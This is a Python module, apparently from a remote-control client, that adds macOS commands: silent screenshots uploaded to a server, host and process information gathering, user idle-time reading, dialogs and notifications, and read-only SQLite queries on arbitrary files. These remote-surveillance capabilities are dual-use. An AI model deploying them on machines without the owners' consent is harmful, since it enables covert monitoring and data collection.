import os
import subprocess
import sys
import time

from client.commands.argument_command_registry import (
    ArgumentCommandSpec,
    ArgumentOptionSpec,
    argument_command,
)
from client.commands.command_context import CommandCancelledError, CommandTimeoutError
from client.commands.common import CommonCommands
from client.commands.interrupts import interruptible
from core.utils.decorator import desc
from core.utils.formatting import get_time, format_dict
from core.utils.logger import logger

MSGBOX_ARGUMENT_SPEC = ArgumentCommandSpec(
    name='msgbox',
    description='Show a native macOS dialog',
    options=[
        ArgumentOptionSpec(name='title', option_type='str', required=False, default='', allow_empty=True,
                           help_text='Dialog title'),
        ArgumentOptionSpec(name='text', option_type='str', required=True, default=None, allow_empty=False,
                           help_text='Dialog text'),
        ArgumentOptionSpec(name='timeout', option_type='int', required=False, default=None,
                           help_text='Auto close timeout in seconds'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

NOTIFY_ARGUMENT_SPEC = ArgumentCommandSpec(
    name='notify',
    description='Show a native macOS notification',
    options=[
        ArgumentOptionSpec(name='title', option_type='str', required=False, default='', allow_empty=True,
                           help_text='Notification title'),
        ArgumentOptionSpec(name='text', option_type='str', required=True, default=None, allow_empty=False,
                           help_text='Notification text'),
        ArgumentOptionSpec(name='sound', option_type='flag', required=False, default=False,
                           help_text='Play the default notification sound'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                           help_text='Show this help message'),
    ]
)

SQLITE_QUERY_SPEC = ArgumentCommandSpec(
    name='sqlite_query',
    description='Read-only SQLite query',
    options=[
        ArgumentOptionSpec(name='db', option_type='str', required=True, help_text='Database file path'),
        ArgumentOptionSpec(name='query', option_type='str', required=True, help_text='SQL query'),
        ArgumentOptionSpec(name='json', option_type='flag', required=False, default=False,
                          help_text='Output as JSON'),
        ArgumentOptionSpec(name='help', option_type='flag', required=False, default=False,
                          help_text='Show this help message'),
    ]
)

class MacCommands(CommonCommands):
    """macOS 平台专用命令集合"""

    def __init__(self, socket):
        super().__init__(socket)

    def _run_command_text(self, command: str) -> str:
        try:
            result = self._run_shell_command(command, timeout=15)
            if result.returncode != 0:
                return ''
            return (result.stdout or '').strip()
        except Exception:
            return ''

    def _build_process_info(self):
        import platform
        import psutil

        process = psutil.Process()
        executable_path = os.path.realpath(sys.executable)
        script_path = os.path.realpath(''.join(sys.argv))

        return {
            'hostname': platform.node(),
            'macos_version': platform.mac_ver()[0],
            'build_version': self._run_command_text('sw_vers -buildVersion'),
            'architecture': platform.machine(),
            'hardware_model': self._run_command_text('sysctl -n hw.model'),
            'cpu_brand': self._run_command_text('sysctl -n machdep.cpu.brand_string'),
            'cpu_cores': os.cpu_count(),
            'memory': f'{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB',
            'python_version': platform.python_version(),
            'process_id': os.getpid(),
            'current_user': process.username(),
            'launch_command': f'{executable_path} {script_path}',
            'process_uptime': f'{round(time.time() - process.create_time(), 2)}s',
            'cwd': os.getcwd()
        }

    def _escape_osascript_text(self, value: str):
        text = str(value or '')
        text = text.replace('\\', '\\\\')
        text = text.replace('"', '\\"')
        return text

    def _spawn_osascript(self, applescript: str):
        process = subprocess.Popen(
            ['osascript', '-e', applescript],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
        self._register_cancel_handler(lambda: self._terminate_process(process))
        return process

    @desc("Capture a screenshot", group='platform')
    @interruptible()
    def screenshot(self):
        screenshot_path = f'screenshot_{get_time()}.png'
        capture_command = f'screencapture -x {screenshot_path}'

        try:
            self._send_interim_result(1, f'Capturing screen: {capture_command}')
            result = self._run_shell_command(capture_command, timeout=15)
            if result.returncode != 0:
                return 0, result.stderr or 'Failed to capture screenshot'

            self._send_interim_result(1, 'Screenshot captured successfully', 0)
            return self._upload_single_file_to_server_result(screenshot_path, category='screenshot')
        except CommandCancelledError:
            return 0, 'Screenshot command cancelled'
        except (CommandTimeoutError, subprocess.TimeoutExpired):
            return 0, 'Screenshot capture timed out and was terminated'
        except Exception as e:
            return 0, f'Failed to capture screenshot: {e}'
        finally:
            if os.path.isfile(screenshot_path):
                try:
                    os.remove(screenshot_path)
                except Exception:
                    pass

    @desc('Show system information', group='platform')
    @interruptible()
    def getinfo(self):
        try:
            payload = self._run_interruptible(self._build_process_info)
            return 1, format_dict(payload)
        except CommandCancelledError:
            return 0, 'Command cancelled'
        except CommandTimeoutError:
            return 0, 'Command timed out and was terminated'
        except Exception as e:
            logger.error(e, exc_info=True)
            return 0, f'Failed to collect system information: {e}'

    @desc('Show user idle time', group='platform')
    @interruptible()
    def idletime(self):
        try:
            from Quartz import CGEventSourceSecondsSinceLastEventType, kCGEventSourceStateHIDSystemState, \
                kCGAnyInputEventType
            idle_seconds = self._run_interruptible(
                CGEventSourceSecondsSinceLastEventType,
                kCGEventSourceStateHIDSystemState,
                kCGAnyInputEventType,
            )
            return 1, f'User idle time: {idle_seconds:.2f} seconds'
        except CommandCancelledError:
            return 0, 'Command cancelled'
        except CommandTimeoutError:
            return 0, 'Command timed out and was terminated'
        except Exception as e:
            return 0, f'Failed to read idle time: {e}'

    @argument_command('msgbox', spec=MSGBOX_ARGUMENT_SPEC)
    def _acmd_msgbox(self, args_dict, payload=None):
        try:
            title = args_dict.get('title', '')
            text = args_dict['text']
            timeout = args_dict.get('timeout')
            escaped_text = self._escape_osascript_text(text)
            escaped_title = self._escape_osascript_text(title)
            applescript = f'display dialog "{escaped_text}" with title "{escaped_title}" buttons {{"OK"}} default button "OK"'
            if timeout is not None and timeout > 0:
                applescript += f' giving up after {timeout}'
            process = self._spawn_osascript(applescript)
            return 1, f'Message box launched asynchronously: {title or "(no title)"}\nPID: {process.pid}'
        except Exception as e:
            return 0, f'Failed to launch message box: {e}'

    @argument_command('notify', spec=NOTIFY_ARGUMENT_SPEC)
    def _acmd_notify(self, args_dict, payload=None):
        try:
            title = args_dict.get('title', '')
            text = args_dict['text']
            sound = args_dict.get('sound', False)
            escaped_text = self._escape_osascript_text(text)
            escaped_title = self._escape_osascript_text(title)
            applescript = f'display notification "{escaped_text}"'
            if escaped_title:
                applescript += f' with title "{escaped_title}"'
            if sound:
                applescript += ' sound name "default"'
            process = self._spawn_osascript(applescript)
            return 1, f'Notification launched asynchronously: {title or "(no title)"}\nPID: {process.pid}'
        except Exception as e:
            return 0, f'Failed to launch notification: {e}'


    @argument_command('sqlite_query', spec=SQLITE_QUERY_SPEC)
    def _acmd_sqlite_query(self, args_dict, payload=None):
        """
        只读 SQLite 查询
        Examples:
            acmd sqlite_query --db /Users/flc/studio.db --query "PRAGMA table_list;"
            acmd sqlite_query --db /Users/flc/studio.db --query "PRAGMA table_info('bookings')"
            acmd sqlite_query --db /Users/flc/studio.db --query "select * from scenes"
        """
        try:
            import sqlite3
            import json

            db_path = args_dict.get('db', '')
            query = args_dict.get('query', '')
            output_json = args_dict.get('json', False)

            if not db_path or not query:
                return 0, 'db and query are required'

            if not os.path.isfile(db_path):
                return 0, f'Database file not found: {db_path}'

            # 只读模式打开
            conn = sqlite3.connect(f'file:{db_path}?mode=ro', uri=True)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()

            cursor.execute(query)
            rows = cursor.fetchall()

            result = [dict(row) for row in rows]
            conn.close()

            if output_json:
                return 1, json.dumps(result, ensure_ascii=False, indent=2)

            if not result:
                return 1, 'No results'

            headers = list(result[0].keys())
            data = [[str(row[h]) for h in headers] for row in result[:100]]

            from core.utils.formatting import format_table
            return 1, format_table(headers, data)

        except sqlite3.Error as e:
            return 0, f'SQLite error: {e}'
        except Exception as e:
            return 0, f'Query failed: {e}'